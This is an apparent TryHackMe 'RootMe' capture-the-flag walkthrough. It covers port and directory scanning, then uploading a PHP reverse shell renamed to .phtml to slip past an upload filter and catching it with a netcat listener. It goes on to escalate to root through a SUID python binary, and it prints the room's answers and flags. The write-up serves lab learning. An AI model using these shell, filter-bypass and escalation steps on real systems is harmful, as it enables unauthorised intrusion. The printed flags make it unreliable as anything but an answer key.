THM-RootMe Walkthrough
First I start by running nmap scan with the command

nmap -sC -sV 10.10.216.94



so as we can see we have 2 ports open on the machine

the first answer: 2

we can see the version of the apache 2.4.29

the second answer: 2.4.29

as we know port 22 is ssh protocol

the third answer: ssh

our next mission is to find directories on the web server

to find the directories I will use a tool called “GoBuster”

the commend that I use is gobuster dir — url http://10.10.216.94 -w /usr/share/wordlists/dirbuster/directory-list-1.0.txt



we can see the /panel is a secret directory

and this is the Fourth answer: /panel

so now I go to the website


and try to see the secret directory we found /panel


so to get a reverse shell we need to use php reverse shell

I went to this URL https://raw.githubusercontent.com/jivoi/pentest/master/shell/rshell.php

and created this file on my machine

and changed the ip and port I want to listen with nc



if we try to upload this php file we see that we cant do this


so we need to change this rshell.php to rshell.phtml

mv rshell.php rshell.phtml


and then we can see that we succeeded


now I use nc -lnvp 9001

and we got our reverse shell 😄


I use the command find / -type f -name user.txt to find the file

we can see where is the file


in /var/www/user.txt

and here is our flag


answer: THM{y0u_g0t_a_sh3ll}

Now that we have a shell, let’s escalate our privileges to root.

now I use the command find / -type f -user root -perm -4000 2>/dev/null

to find files with SUID permission


and we found our answer


answer: /usr/bin/python

for the escalate our privileges I go to https://gtfobins.github.io/


now I use the command ./python -c ‘import os; os.execl(“/bin/sh”, “sh”, “-p”)’


now we can go to root directory


and the answer: THM{pr1v1l3g3_3sc4l4t10n}
